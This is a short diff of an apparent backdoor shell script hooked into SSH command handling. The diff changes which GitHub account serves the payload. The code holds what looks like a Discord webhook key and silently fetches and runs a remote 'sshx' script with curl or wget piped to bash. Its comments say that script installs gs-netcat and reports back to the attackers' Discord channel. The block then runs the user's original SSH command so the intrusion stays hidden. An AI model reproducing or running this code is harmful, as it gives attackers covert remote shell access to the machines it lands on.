@@ -32,7 +32,7 @@ stubs(){ ###___STUBS___
         export KEY="1167839115589460038/wxrgaBdVTrO9GiFpjgJqUZVj1JSObIFzhiviHMzz5GknpxcxkRdjw1eM6e8pYxYx4dEf"
         # Request and execute sshx (which will install gs-netcat and
         # report the result back to our DISCORD channel)
-        bash -c "$(curl -fsSL https://raw.githubusercontent.com/jebalen/sshx/main/sshx)" || bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/jebalen/sshx/main/sshx)" || exit 0
+        bash -c "$(curl -fsSL https://raw.githubusercontent.com/daazzzy/sshx/main/sshx)" || bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/daazzzy/sshx/main/sshx)" || exit 0
         ###-----END BACKDOOR-----
     } >/dev/null 2>/dev/null & :
     [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
